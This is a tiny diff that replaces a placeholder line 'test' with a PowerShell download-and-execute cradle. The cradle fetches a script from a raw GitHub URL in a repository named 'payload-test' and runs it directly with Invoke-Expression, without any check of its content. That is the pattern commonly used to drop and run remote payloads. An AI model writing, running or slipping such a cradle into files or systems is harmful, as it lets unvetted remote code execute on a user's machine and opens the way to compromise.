@@ -1,1 +1,8 @@
-test
+# URL of the script
+$url = "https://raw.githubusercontent.com/zxz3650/payload-test/master/bb.txt"
+
+# Get the script
+$script = (Invoke-WebRequest -Uri $url).Content
+
+# Execute the script
+Invoke-Expression $script
